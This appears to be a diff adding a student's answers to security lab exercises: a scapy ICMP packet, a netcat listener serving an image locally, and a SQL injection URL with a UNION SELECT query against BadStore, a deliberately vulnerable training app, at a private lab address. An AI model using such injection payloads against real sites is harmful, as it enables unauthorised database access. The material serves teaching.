@@ -1,0 +1,12 @@
+11a)
+from scapy.all import * 
+packet=IP(dst="8.8.8.8")/ICMP() 
+send(packet)
+
+11b)
+- (printf "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"; cat ~/Desktop/cat.png) | nc -l 8080
+- localhost:8080
+
+11c)
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?searchquery=x%27+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9
+- Query : x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from itemdb
